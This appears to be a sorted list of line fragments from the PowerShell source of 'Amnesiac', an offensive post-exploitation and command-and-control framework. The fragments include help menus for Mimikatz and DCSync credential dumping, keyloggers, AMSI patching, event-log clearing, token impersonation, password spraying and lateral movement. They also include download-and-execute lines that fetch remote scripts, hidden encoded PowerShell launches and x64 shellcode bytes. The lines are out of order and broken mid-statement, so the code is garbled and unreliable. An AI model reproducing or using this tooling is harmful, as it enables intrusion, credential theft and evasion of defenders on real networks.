"$index = [array]::IndexOf($commandParts, ""-Password"", [System.StringComparison]::CurrentCultureIgnoreCase)"
"$index = [array]::IndexOf($commandParts, ""-Targets"", [System.StringComparison]::CurrentCultureIgnoreCase)"
"$index = [array]::IndexOf($commandParts, ""-UserName"", [System.StringComparison]::CurrentCultureIgnoreCase)"
"$initialInfo = $sr.ReadLine().Split(',')"
"$localFullPath = $command.Split(' ', 2)[1]"
"$monitoringScript = @"""
"$null"""
"$oneLiner = ""[IO.File]::WriteAllBytes('$UserPath"
"$output = """""
"$output = $output -replace """
"$p.Dispose()"""
"$p=New-Object System.IO.Pipes.NamedPipeClientStream(""""$ComputerName"""",""""$PipeName"""",'InOut')"
"$p=New-Object System.IO.Pipes.NamedPipeClientStream('$ComputerName','$PipeName','InOut')"
"$pS.Dispose()"""
"$pS=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,"
"$pid -Force"")"
"$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(""$ComputerName"", ""$PipeName"", 'InOut')"
"$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(""$ComputerName"", $PipeName, 'InOut')"
"$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(""$Target"", $PipeName, 'InOut')"
"$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream(""$PipeName"", 'InOut', 1, 'Byte', 'None', 4096, 4096, "
"$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, 'InOut', 1, 'Byte', 'None', 1028, 1028, $securityDescriptor)"
"$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream('$PN', 'InOut', 1, 'Byte', 'None', 1028, 1028, "
"$process = Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '-ep Bypass', '-enc $encCommand' -PassThru"
"$process.Id"""
"$promptString = ""[$PromptComputerName]: $remotePath """
"$promptString = ""[$computerNameOnly]: $remotePath """
"$ps, 600000, [System.Threading.Timeout]::Infinite)"
"$ps.Dispose()"""
"$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,"
"$psScript = ""Start-Sleep -Seconds 30"
"$randomvalue = $randomvalue -join """""
"$rawCommand = ""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/SimpleAMSI.ps1')"
"$rawCommand = ""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/TGT_Monitor.ps1')"
"$remoteFileName', [Convert]::FromBase64String('$fileContentBase64'))"""
"$remotePath = """""
"$res -split """""
"$res=iex """""
"$result -split """
"$result = Invoke-Expression """
"$result-split """""
"$result=iex """""
"$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)"
"$runspacePool = [runspacefactory]::CreateRunspacePool(1, [Environment]::ProcessorCount)"
"$sU,""""FullControl"""",""""Allow"""")"
"$sU=New-Object System.Security.Principal.SecurityIdentifier """"$SID"""""
"$sU=New-Object System.Security.Principal.SecurityIdentifier """"S-1-1-0"""""
"$scope = New-Object System.Management.ManagementScope("""
"$server = New-Object SimpleFileServer ([IPAddress]::Any, $Port)"
"$serverOutput = """""
"$serviceToDelete = ""$ServiceName"" "
"$serviceToDelete"""
"$singleuser = New-Object System.Security.Principal.SecurityIdentifier ""$SID"""
"$singleuser, ""FullControl"", ""Allow"")"
"$startarguments = """
"$startarguments = ""start $ServiceName"""
"$stoparguments = """
"$stoparguments = ""delete $serviceToDelete"""
"$subfolders = @(""Clipboard"", ""Downloads"", ""History"", ""Keylogger"", ""Payloads"", ""Screenshots"", ""Scripts"", ""Monitor_TGTs"")"
"$sw.WriteLine("""
"$sw.WriteLine("""""
"$sw.WriteLine(""$FinalCommand"")"
"$sw.WriteLine(""$InjectCommand"")"
"$sw.WriteLine(""$cmd"")"
"$sw.WriteLine(""$finalstring"")"
"$sw.WriteLine(""$predefinedCommands"")"
"$sw.WriteLine(""$rawCommand"")"
"$sw.WriteLine(""Find-LocalAdminAccess -Method SMB -Command "
"$sw.WriteLine(""Find-LocalAdminAccess -Method SMB -Domain $userdefdomain -Command "
"$sw.WriteLine(""Find-LocalAdminAccess -Method SMB -Domain $userdefdomain -DomainController $userdefdc -Command "
"$sw.WriteLine(""Find-LocalAdminAccess -Method WMI -Command "
"$sw.WriteLine(""Find-LocalAdminAccess -Method WMI -Domain $userdefdomain -Command "
"$sw.WriteLine(""Find-LocalAdminAccess -Method WMI -Domain $userdefdomain -DomainController $userdefdc -Command "
"$sw.WriteLine(""Get-Clipboard"")"
"$sw.WriteLine(""Invoke-SMBRemoting -ComputerName "
"$sw.WriteLine(""Invoke-WMIRemoting -ComputerName "
"$sw.WriteLine(""Start-Sleep -Seconds 10"
"$sw.WriteLine(""Write-Output $PN"")"
"$sw.WriteLine(""Write-Output $SyncString"")"
"$sw.WriteLine(""[Convert]::ToBase64String([System.IO.File]::ReadAllBytes("
"$sw.WriteLine(""[Convert]::ToBase64String([System.IO.File]::ReadAllBytes('$historyFile'))"")"
"$sw.WriteLine(""exit"")"
"$sw.WriteLine(""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Ask4Creds.ps1')"")"
"$sw.WriteLine(""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Find-LocalAdminAccess.ps1')"")"
"$sw.WriteLine(""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-SMBRemoting.ps1')"
"$sw.WriteLine(""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-SessionHunter.ps1')"")"
"$sw.WriteLine(""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/PInject.ps1')"")"
"$sw.WriteLine(""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/PassSpray.ps1')"")"
"$sw.WriteLine(""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Sync.ps1')"")"
"$sw.WriteLine(""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Token-Impersonation.ps1')"
"$sw.WriteLine(""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Validate-Credentials.ps1')"")"
"$sw.WriteLine(""prompt "
"$sw.WriteLine(""try{type c:"
"$sw.WriteLine(""whoami"")"
"$sw.WriteLine('$usersDirectory = ""C:"
"$sw.WriteLine('Write-Output ""["
"$tcb, "
"$test = ""$($shellcode "
"$test = $test.replace(' ','')"
"$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite)"
"$trimmedShCodePlaceholder /enc:AES"")"
"$user,"
"$userdefdc = """""
"$userdefdomain = """""
"$userdefpassword = """""
"$userdeftargets = """""
"$userdefusername = """""
"$w.WriteLine("""""
"$whoamiInfo = """""
"$wmiDataOutput.CommandStatus = ""NotStarted"""
"', ''"
"', 11"
"', 2"
"', 3"
"', 7"
"'DisplayName' = "" [$sessionNumber]"""
"'DisplayUserID' = ""nt authority"
"'Remove-Item -Path ""C:"
"'SUser' = "" [$($_.DisplayUserID)]"""
"'SUser' = "" [$sessionuser]"""
"'SX' = "" [$index]"""
"'wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version'"
"'wmic startup get Caption,Command,Location,User'"
"(sAMAccountType=805306369)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"""
") {Write-Output """"}"
"."" -or "
"."", "",DC="")"
".',',DC=')"" } else { ""LDAP://DC=$($Domain -replace '"
".',',DC=')"" }"
"1 ', '2"
"= "" ["
"= "" [-] The operation timed out [$computerNameOnly]"
"= ""$line"
"= $result.Properties[""dNSHostName""]"
"= $size) { $command.Substring($i, [Math]::Min($size, $command.Length - $i)) })"
"= 0x01,0xc2             "
"= 0x04,0x53             "
"= 0x0f,0x05             "
"= 0x41,0x0f,0xb7,0x0c,0x4a      "
"= 0x41,0x8b,0x04,0x8b       "
"= 0x41,0x8b,0x34,0x8e       "
"= 0x41,0x8b,0x49,0x3c       "
"= 0x41,0x8b,0x4f,0x18       "
"= 0x41,0xb7,0x88            "
"= 0x41,0xb8,0x83,0xb9,0xb5,0x78     "
"= 0x41,0xb8,0x98,0xfe,0x8a,0x0e "
"= 0x44,0x39,0xc2            "
"= 0x45,0x8b,0x3f            "
"= 0x45,0x8b,0x57,0x24       "
"= 0x45,0x8b,0x5f,0x1c       "
"= 0x45,0x8b,0x77,0x20       "
"= 0x48,0x31,0xc0            "
"= 0x48,0x31,0xc9            "
"= 0x48,0x31,0xd2            "
"= 0x48,0x31,0xf6            "
"= 0x48,0x83,0xec,0x28       "
"= 0x48,0x89,0xc3            "
"= 0x48,0x8b,0x70,0x18       "
"= 0x48,0x8b,0x76,0x20       "
"= 0x48,0x8d,0x0c,0x24       "
"= 0x48,0xb9"
"= 0x48,0xb9,0xdf,0xdf,0xdf,0xdf,0xdf,0xdf,0xdf,0xff,0x48,0xf7,0xd1,0x51"
"= 0x48,0xf7,0xd1"
"= 0x48,0xff,0xc1            "
"= 0x48,0xff,0xc2            "
"= 0x49,0x01,0xcf            "
"= 0x4c,0x01,0xc8            "
"= 0x4c,0x01,0xce            "
"= 0x4c,0x8b,0x0e            "
"= 0x4d,0x01,0xca            "
"= 0x4d,0x01,0xcb            "
"= 0x4d,0x01,0xce            "
"= 0x4d,0x01,0xcf            "
"= 0x4d,0x31,0xff            "
"= 0x4d,0x8b,0x09            "
"= 0x4d,0x8b,0x49,0x20       "
"= 0x65,0x48,0x8b,0x42,0x60      "
"= 0x74,0x07             "
"= 0x75,0xda             "
"= 0x84,0xc0             "
"= 0xc1,0xca,0x0d            "
"= 0xe3,0x3f             "
"= 0xe8,0x84,0xff,0xff,0xff      "
"= 0xe8,0x92,0xff,0xff,0xff      "
"= 0xeb,0x63             "
"= 0xeb,0xf4             "
"= 0xff,0xc9             "
"= 0xff,0xd0             "
"A-Za-z0-9.-]', '_'"
"Add-Type -TypeDefinition @"""
"Administrator' -Password 'P@ssw0rd!'"""
"Amnesiac"""
"CIMV2"" -ClassName $ClassID -CimSession $cimSession -ErrorAction SilentlyContinue"
"CIMV2:$ClassID"").Delete()}"
"Clipboard"""
"ConsoleHost_history.txt"""
"Downloads"""
"Enum-Creds"""
"Get-Item -Path ""HKLM:"
"History"""
"Invoke-DpapiDump"""
"Invoke-HiveDump"""
"Invoke-Item ""$fileName"""
"Keylogger"""
"LocalAdminAccess.txt"" -Force"
"LocalAdminAccess.txt"""
"Monitor_TGTs"""
"Paths""'"
"Screenshots"""
"Scripts""}"
"Start-Process -FilePath ""powershell.exe"" -ArgumentList ""-NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc $b64psScript"" -WindowStyle Hidden"
"Start-Process -FilePath ""powershell.exe"" -ArgumentList ""-ep bypass -WindowS Hidden -enc $b64psScript"" -WindowStyle Hidden"
"Start-Process powershell.exe -ArgumentList ""-WindowS Hidden -ep Bypass -enc $b64FileServerMonitoringScript"" -WindowStyle Hidden"
"Start-Process powershell.exe -ArgumentList ""-WindowS Hidden -ep Bypass -enc $b64monitoringScript"" -WindowStyle Hidden"
"Start-Process powershell.exe -ArgumentList ""-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -enc $b64monitoringScript"" -WindowStyle Hidden"
"TGT_Monitor -Clear"""
"Users"""
"WinRM"""
"Write-Error "" [-] Failed to exit session with PipeName: $($selectedMultiSession.PipeName). Error: $_"""
"Write-Error "" [-] Failed to exit session with PipeName: $($selectedSession.PipeName). Error: $_"""
"Write-Output ""    Access_Check -Method PSRemoting -Command "
"Write-Output ""    Access_Check -Method PSRemoting -Domain ferrari.local -DomainController DC01.ferrari.local"""
"Write-Output ""    Access_Check -Method PSRemoting -Targets "
"Write-Output ""    Access_Check -Method PSRemoting"""
"Write-Output ""    Access_Check -Method SMB -Domain ferrari.local -DomainController DC01.ferrari.local"""
"Write-Output ""    Access_Check -Method SMB -Targets "
"Write-Output ""    Access_Check -Method SMB"""
"Write-Output ""    Do not run as local user (e.g.: nt authority"
"Write-Output ""    Do not set $computerNameOnly as target if using WMI."""
"Write-Output ""    Find-LocalAdminAccess -Method PSRemoting -Command 'whoami' -NoOutput"""
"Write-Output ""    Find-LocalAdminAccess -Method PSRemoting -Command 'whoami'"""
"Write-Output ""    Find-LocalAdminAccess -Method PSRemoting -Domain ferrari.local -DomainController DC01.ferrari.local"""
"Write-Output ""    Find-LocalAdminAccess -Method PSRemoting -InLine"""
"Write-Output ""    Find-LocalAdminAccess -Method PSRemoting -Targets "
"Write-Output ""    Find-LocalAdminAccess -Method PSRemoting -UserName "
"Write-Output ""    Find-LocalAdminAccess -Method PSRemoting"""
"Write-Output ""    Find-LocalAdminAccess -Method SMB -Command 'whoami' -NoOutput"""
"Write-Output ""    Find-LocalAdminAccess -Method SMB -Command 'whoami'"""
"Write-Output ""    Find-LocalAdminAccess -Method SMB -Domain ferrari.local -DomainController DC01.ferrari.local"""
"Write-Output ""    Find-LocalAdminAccess -Method SMB -InLine"""
"Write-Output ""    Find-LocalAdminAccess -Method SMB -Targets "
"Write-Output ""    Find-LocalAdminAccess -Method SMB"""
"Write-Output ""    Find-LocalAdminAccess -Method WMI -Command 'whoami' -NoOutput"""
"Write-Output ""    Find-LocalAdminAccess -Method WMI -Command 'whoami'"""
"Write-Output ""    Find-LocalAdminAccess -Method WMI -Domain ferrari.local -DomainController DC01.ferrari.local"""
"Write-Output ""    Find-LocalAdminAccess -Method WMI -InLine"""
"Write-Output ""    Find-LocalAdminAccess -Method WMI -Targets "
"Write-Output ""    Find-LocalAdminAccess -Method WMI -UserName "
"Write-Output ""    Find-LocalAdminAccess -Method WMI"""
"Write-Output ""    Invoke-Command -ComputerName Server01.ferrari.local -ScriptBlock {whoami}"""
"Write-Output ""    Invoke-DCSync -Domain domain.local -DomainController DC01.domain.local"""
"Write-Output ""    Invoke-DCSync -Hashcat"""
"Write-Output ""    Invoke-DCSync"""
"Write-Output ""    Invoke-PassSpray                             Spray an empty password across the Domain"""
"Write-Output ""    Invoke-PassSpray -Password P@ssw0rd!         Spray a password across the Domain"""
"Write-Output ""    Invoke-PassSpray -Password P@ssw0rd! -Domain ferrari.local -DomainController DC01.ferrari.local"""
"Write-Output ""    Invoke-SMBRemoting -ComputerName Server01.ferrari.local -Command 'whoami /all'"""
"Write-Output ""    Invoke-SessionHunter -CheckAsAdmin -FailSafe"""
"Write-Output ""    Invoke-SessionHunter -CheckAsAdmin -UserName 'ferrari"
"Write-Output ""    Invoke-SessionHunter -CheckAsAdmin"""
"Write-Output ""    Invoke-SessionHunter -Domain ferrari.local -DomainController DC01.ferrari.local"""
"Write-Output ""    Invoke-SessionHunter"""
"Write-Output ""    Invoke-WMIRemoting -ComputerName Server01.ferrari.local -Command 'whoami /all' -Username '."
"Write-Output ""    Invoke-WMIRemoting -ComputerName Server01.ferrari.local -Command 'whoami /all' -Username 'ferrari"
"Write-Output ""    Invoke-WMIRemoting -ComputerName Server01.ferrari.local -Command 'whoami /all'"""
"Write-Output ""    SMBRemoting <fqdn> <cmd>      Run command on target as current user using SMBRemoting"""
"Write-Output ""    Token-Impersonation -MakeToken -Username "
"Write-Output ""    Token-Impersonation -Rev2Self"""
"Write-Output ""    Token-Impersonation -Steal -ProcessID 5380"""
"Write-Output ""    Validate-Credentials -UserName Senna -Domain ferrari.local                          Test Empty Password"""
"Write-Output ""    Validate-Credentials -UserName Senna -Password FuerteCorre1                         Test Credentials"""
"Write-Output ""    Validate-Credentials -UserName Senna -Password FuerteCorre1 -Domain ferrari.local   Specify Domain"""
"Write-Output ""    WMIRemoting <fqdn> <cmd>      Run command on target as current user using WMIRemoting"""
"Write-Output ""    shell_psadmin                                  Get a shell on targets where the current user is local admin (PSRemoting)"""
"Write-Output ""    shell_psadmin -Domain _ -DomainController _    Specify a target Domain and Domain Controller"""
"Write-Output ""    shell_psadmin -Targets "
"Write-Output ""    shell_psadmin -Username "
"Write-Output ""    shell_smbadmin                                 Get a shell on targets where the current user is local admin (SMB)"""
"Write-Output ""    shell_smbadmin -Domain _ -DomainController _   Specify a target Domain and Domain Controller"""
"Write-Output ""    shell_smbadmin -Targets "
"Write-Output ""    shell_tknadmin                                  Get a shell on targets where the current user is local admin (PSRemoting)"""
"Write-Output ""    shell_tknadmin -Domain _ -DomainController _    Specify a target Domain and Domain Controller"""
"Write-Output ""    shell_tknadmin -Targets "
"Write-Output ""    shell_wmiadmin                                 Get a shell on targets where the current user is local admin (WMI)"""
"Write-Output ""    shell_wmiadmin -Domain _ -DomainController _   Specify a target Domain and Domain Controller"""
"Write-Output ""    shell_wmiadmin -Targets "
"Write-Output ""    shell_wmiadmin -Username "
"Write-Output "" "
"Write-Output "" $PwshRawClientScript"""
"Write-Output "" $PwshRawServerScript"""
"Write-Output "" $UDT"""
"Write-Output "" AV                 Check local AV"""
"Write-Output "" Admin Sessions:"""
"Write-Output "" Ask4Creds          Prompt User for Credentials"""
"Write-Output "" AutoMimi           Load Katz and dump"""
"Write-Output "" Available Commands:"""
"Write-Output "" Bookmarks:"""
"Write-Output "" ClearHistory       Clear History for Current User"""
"Write-Output "" ClearLogs          Clear Logs from Event Viewer"""
"Write-Output "" Clipboard          Get the clipboard (text)"""
"Write-Output "" CredMan            CredManager Dump"""
"Write-Output "" CredValidate       Validate Domain Credentials"""
"Write-Output "" DCSync             Performs DCSync"""
"Write-Output "" Download           Download file from remote system [file name]"""
"Write-Output "" Dpapi              Retrieve credentials protected by DPAPI"""
"Write-Output "" Exit               Background the current session"""
"Write-Output "" Find-LocalAdminAccess    Switch between SMB and PSRemoting"""
"Write-Output "" GLSet <>           Set Global-Listener Pipe Name"""
"Write-Output "" GLSet <string>           Set Global-Listener Pipe Name"""
"Write-Output "" GListener          Print Global-Listener Payload"""
"Write-Output "" GetSystem          Get a System Shell [New Session]"""
"Write-Output "" Global-Listener Sessions:"""
"Write-Output "" HashGrab           Attempt to retrieve the Hash of the current user"""
"Write-Output "" Help               Help menu"""
"Write-Output "" History            Get pwsh history for all users"""
"Write-Output "" Hive               HiveDump"""
"Write-Output "" Impersonation      Token Impersonation "
"Write-Output "" Kerb               Kerb TGTs Dump"""
"Write-Output "" Keylog             Start Keylogger"""
"Write-Output "" KeylogRead         Read Keylog output"""
"Write-Output "" Kill               Terminate the current session"""
"Write-Output "" LocalAdminAccess   Check Targets for Local Admin Access"""
"Write-Output "" Migrate <pid>      Inject payload into specified pid [New Session]"""
"Write-Output "" Migrate2 <pid>     Different migration syntax [In case the above fails]"""
"Write-Output "" Mimi               Load Katz"""
"Write-Output "" Monitor            Monitor Cache for TGTs"""
"Write-Output "" MonitorClear       Clear TGTs from Monitor activity"""
"Write-Output "" MonitorRead        Retrieve TGTs from Monitor activity"""
"Write-Output "" Net                Netstat Command"""
"Write-Output "" OneIsNone          Get a Backup Shell"""
"Write-Output "" PInject            Load ProcessInjection"""
"Write-Output "" PassSpray          Domain Password Spray"""
"Write-Output "" Patch              Patch 4MZI"""
"Write-Output "" PatchNet           Patch 4MZI .NET"""
"Write-Output "" PowerView          Load PowerView"""
"Write-Output "" Process            Display Running Processes"""
"Write-Output "" RDPKeylog          Start RDP Keylogger"""
"Write-Output "" RDPKeylogRead      Read RDP Keylog output"""
"Write-Output "" Remoting           Remote Command Execution SMB"
"Write-Output "" RepoURL                  Set Repo URL to Default"""
"Write-Output "" RepoURL <URL>            Set Repo URL to specified URL"""
"Write-Output "" Rubeus             Load Rubeus"""
"Write-Output "" Scanning will stop in 40 seconds..."""
"Write-Output "" Scramble           Rotate Global-Listener Pipe Name"""
"Write-Output "" Screen4K           Take a screenshot [4K]"""
"Write-Output "" ScreenShot         Take a screenshot [1080p]"""
"Write-Output "" Serve                    Serve scripts from 0.0.0.0:8080"""
"Write-Output "" Serve <port> <folder>    Serve scripts from specified folder and port"""
"Write-Output "" Services           Display Running Services"""
"Write-Output "" SessionHunter      Hunt for Active User Sessions"""
"Write-Output "" Sessions           Show active Sessions"""
"Write-Output "" Single Listener Sessions:"""
"Write-Output "" Software           Display Installed Software"""
"Write-Output "" Start-Process powershell.exe -WindowS Hidden -ArgumentList "
"Write-Output "" Startup            Display Startup Apps"""
"Write-Output "" Sync               Re-Sync Stream"""
"Write-Output "" TLS                Enable TLS 1.2"""
"Write-Output "" Toggle             Switch payload format [default: cmd(b64)]"""
"Write-Output "" Upload             Upload file to remote system [full path]"""
"Write-Output "" User-Defined Targets:"""
"Write-Output "" ["
"Write-Output "" [$index] $session"""
"Write-Output "" [$index] $sessionName"""
"Write-Output "" [-] Please specify a Target"""
"Write-Output "" [-] Please specify a target"""
"Write-Output "" [2] Global-Listener (multiple targets)"""
"Write-Output "" [3] Scan network for listening targets"""
"Write-Output "" [4] Shell via Find-LocalAdminAccess"""
"Write-Output "" bookmark <sess.numb.>    Bookmark selected session"""
"Write-Output "" bookmarks                Hide/Display Bookmarks"""
"Write-Output "" cmd /c powershell -windows hidden "
"Write-Output "" cmd /c powershell -windowst hidden "
"Write-Output "" exit                     Quit Amnesiac"""
"Write-Output "" help                     Displays this list of commands"""
"Write-Output "" kill <sess.numb.>        Kill selected session"""
"Write-Output "" kill all                 Kill all sessions"""
"Write-Output "" powershell.exe -NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc $b64ClientScript "
"Write-Output "" powershell.exe -NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc $b64ServerScript "
"Write-Output "" powershell.exe -ep bypass -Window Hidden -c "
"Write-Output "" scramble                 Rotate Global-Listener Pipe Name"""
"Write-Output "" sessions                 Hide/Display Active Sessions"""
"Write-Output "" switch                   Switch between SMB and WMI for Admin Access Scan"""
"Write-Output "" targets                  Hide/Display User-Defined Targets"""
"Write-Output "" targets <Path or tgrts>  Path or "
"Write-Output "" targets check            Check for and list only alive targets"""
"Write-Output "" targets clear            Clear all User-Defined Targets"""
"Write-Output "" toggle                   Switch payload format (default: b64)"""
"Write-Output "" unbookmark <sess.numb.>  Remove a bookmark"""
"Write-Output """" "
"Write-Output """""
"Write-Output """"}"
"Write-Output ""$($Result.ComputerName): Error - $($Result.Error)"""
"Write-Output ""$($Result.Output.TrimEnd())"""
"Write-Output ""$IP"""
"Write-Output ""$line"""
"Write-Output ""Error downloading '$url': $_"""
"Write-Output ""Please use Method WMI or PSRemoting if you need to run as a different user"""
"Write-Output ""["
"Write-Output ""[$($ComputerName)]: An unexpected error occurred"""
"Write-Output ""[$($ComputerName)]: Connection timed out"""
"Write-Output ""[$($Target)]: An unexpected error occurred"""
"Write-Output ""[$($Target)]: Connection timed out"""
"Write-Output ""[-] Injection Failed. Did you load the module "
"Write-Output ""[-] No connection was established. Returning to previous menu..."""
"Write-Output ""[-] Please provide your host IP address: -IP <YOUR-IP>"""
"Write-Output ""[-] The file specified does not exist."""
"Write-Warning ""[-] Failed on $($result.Computer): $($result.Message)"""
"[Byte[]] $shellcode = 0x48,0x31,0xd2        "
"[Console]::Write("" Choose an option or session number, or type 'exit' to quit "")"
"[Console]::Write("" Choose an option or type 'exit' to quit "")"
"[System.IO.File]::WriteAllBytes($fileName, [Convert]::FromBase64String($fileContentBase64))"
"[System.IO.File]::WriteAllText($fileName, $ClipboardContent)"
"[System.IO.File]::WriteAllText($fileName, $KeylogContent)"
"[string]$Command,"
"[string]$ComputerName,"
"[string]$Domain,"
"[string]$DomainController,"
"[string]$GlobalPipeName,"
"[string]$IP,"
"[string]$Method,"
"[string]$Password,"
"[string]$PipeName,"
"[string]$ServiceName,"
"[string]$Target,"
"[string]$Targets,"
"[string]$Timeout = ""30000"","
"[string]$UniquePipeID,"
"[string]$UserName,"
"[switch]$CheckTargets,"
"[switch]$Detached,"
"[switch]$NoOutput,"
"[switch]$SaveOutput,"
"[switch]$ScanMode,"
"[switch]$ShowErrors,"
"[switch]$SkipPortScan,"
"[switch]$scsafe,"
"] $($Result.ComputerName)"""
"] $UserName has Local Admin access on:"""
"] .NET Patched'"""
"] Admin Access Scan Protocol: SMB"""
"] Admin Access Scan Protocol: WMI"""
"] Admin Access: $($TempAdminAccessTargets.count) Targets [PSRemoting]"""
"] Admin Access: $($TempAdminAccessTargets.count) Targets [PSRemoting]""}"
"] Admin Access: $($TempAdminAccessTargets.count) Targets [SMB]"""
"] Admin Access: $($TempAdminAccessTargets.count) Targets [SMB]""}"
"] Admin Access: $($TempAdminAccessTargets.count) Targets [WMI]"""
"] Admin Access: $($allTargets.count) Targets [SMB]"""
"] Available IP addresses:"""
"] Check Access:"""
"] Clipboard saved to $fileName"""
"] Command execution completed"""
"] Core Commands:"""
"] Creating Service on Remote Target..."""
"] Current Process [x64]:""}else{Write-Output ""["
"] Current Process [x86]:""}"
"] Domain Actions:"""
"] Downloading Scripts to $destinationFolder"""
"] File Server started with PID $processId. To kill it [Stop-Process -Id $processId]"""
"] File downloaded to $fileName"""
"] File uploaded"""
"] Find-LocalAdminAccess Method: PSRemoting"""
"] Find-LocalAdminAccess Method: SMB"""
"] Get a Shell:"""
"] Global-Listener PipeName: $global:MultiPipeName"""
"] History Cleared""'"
"] History File Saved to: $fileName"""
"] Important:"""
"] Keylog saved to $fileName"""
"] Keylogger started with PID $($processId.Trim()). To kill it [Stop-Process -Id $($processId.Trim())]""')"
"] Local Actions:"""
"] Logs Cleared""'"
"] New session established [$computerNameOnly]"""
"] Output saved to $fileName"""
"] Patched'"""
"] Payload format: cmd(b64)"""
"] Payload format: cmd(raw)"""
"] Payload format: exe"""
"] Payload format: gzip"""
"] Payload format: pwsh"""
"] Payload format: pwsh(raw)"""
"] Payload saved to: $exefilelocation"""
"] Payload:"""
"] Pipe Name: $PipeName"""
"] Process running with"" -or $_ -match """
"] Processes sorted by PID:"""
"] Processes sorted by ProcessName:"""
"] Processes sorted by Username:"""
"] RDP Keylog saved to $fileName"""
"] RDP Keylogger started with PID $($processId.Trim()). To kill it [Stop-Process -Id $($processId.Trim())]""')"
"] Repo URL set to $global:ServerURL"""
"] Resolving Foreign Addresses"""
"] Resynchronized with stream."""
"] Screenshot location: $fileName"""
"] Scripts Loading:"""
"] Service Name: $ServiceName"""
"] Shellcode (hex):"""
"] Shortcuts:"""
"] Sucessfully injected the shellcode into"" -or $_ -match ""is not running""}"
"] System Commands:"""
"] TGT_Monitor started with PID $($processId.Trim()). To kill it [Stop-Process -Id $($processId.Trim())]""')"
"] TLS Enabled""'"
"] Targets Check Completed"""
"] Targets Cleared"""
"] Targets loaded. Type 'targets' to list/hide them"""
"] Targets set. Type 'targets' to list/hide them"""
"] The current user has Local Admin access on:"""
"] Usage:"""
"] User Activity:"""
"] Waiting for connection... [30 seconds timeout]"""
"] Welcome to Amnesiac. Type 'help' to list/hide available commands""}"
"catch{$global:Message = "" [-] Invalid command. Type 'help' to list/hide available commands"""
"cimv2"" -Credential $cred}"
"cimv2"", $connectionOptions)"
"cimv2"", [string]::Empty, $null)"
"cimv2""}"
"cmd.exe /domain: /dc: /username: /password:fakepass /ptt /ticket:'"""
"d{1,3}("
"d{1,3}){3}$'"
"else {Write-Output ""[-] Empty Clipboard"""
"else {Write-Output ""[-] Empty Keylog"""
"else {Write-Output ""[-] Empty RDP Keylog"""
"elseif ($Command -eq ""AutoMimi"") {"
"elseif ($Command -eq ""ClearHistory"") {"
"elseif ($Command -eq ""ClearLogs"") {"
"elseif ($Command -eq ""CredMan"") {"
"elseif ($Command -eq ""Dpapi"") {"
"elseif ($Command -eq ""Hive"") {"
"elseif ($Command -eq ""Kerb"") {"
"elseif ($Command -eq ""Mimi"") {"
"elseif ($Command -eq ""Net"") {"
"elseif ($Command -eq ""Patch"") {"
"elseif ($Command -eq ""PatchNet"") {"
"elseif ($Command -eq ""PowerView"") {"
"elseif ($Command -eq ""Process"") {"
"elseif ($Command -eq ""Rubeus"") {"
"elseif ($Command -eq ""Services"") {"
"elseif ($Command -eq ""Sessions"") {"
"elseif ($Command -eq ""Software"") {"
"elseif ($Command -eq ""Startup"") {"
"elseif ($Command -eq ""screen4K"") {"
"elseif ($Command -eq ""screenshot"") {"
"elseif ($Method -eq ""PSRemoting"") {Invoke-Command -ScriptBlock { hostname } -ComputerName $Computer -ErrorAction SilentlyContinue}"
"elseif ($Method -eq ""SMB"") {ls "
"elseif ($Method -eq ""WMI"") {Get-WmiObject -Class Win32_OperatingSystem -ComputerName $Computer -ErrorAction SilentlyContinue}"
"elseif ($UserName -AND $Password -AND ($Method -eq ""PSRemoting"")) {Invoke-Command -ScriptBlock { hostname } -ComputerName $Computer -ErrorAction SilentlyContinue -Credential $cred}"
"elseif ($command -eq ""GetSystem"") {"
"elseif ($command -eq ""LocalAdminAccess"") {"
"elseif ($command -eq ""OneIsNone"") {"
"elseif ($command -eq ""SessionHunter"") {"
"elseif ($command -eq ""exit"") {"
"elseif ($command -eq ""sync"") {"
"elseif ($command -like ""Download "
"elseif ($command -like ""Migrate "
"elseif ($command -like ""PInject "
"elseif ($command -like ""ShellGen "
"elseif ($command -like ""Upload "
"elseif ($command -like ""help"") {"
"elseif ($command -like ""shell_psadmin"
"elseif ($command -like ""shell_smbadmin"
"elseif ($command -like ""shell_tknadmin"
"elseif ($command -like ""shell_wmiadmin"
"elseif (($command -like ""SMBRemoting "
"elseif($Command -eq ""HashGrab""){"
"elseif($Command -eq ""Keylog""){"
"elseif($Command -eq ""Monitor""){"
"elseif($Command -eq ""MonitorClear""){"
"elseif($Command -eq ""MonitorRead""){"
"elseif($Command -eq ""PInject""){"
"elseif($Command -eq ""RDPKeylog""){"
"elseif($Command -eq ""Remoting""){"
"elseif($Command -eq ""TLS""){"
"elseif($Method -eq ""PSRemoting""){$PortScan = 5985}"
"elseif($Method -eq ""SMB""){$PortScan = 445}"
"elseif($command -eq ""KeylogRead""){"
"elseif($command -eq ""RDPKeylogRead""){"
"elseif($command -like ""Migrate2 "
"elseif($command -ne """"){"
"elseif($global:localadminaccesspayload -eq 'SMB'){$global:Message = "" ["
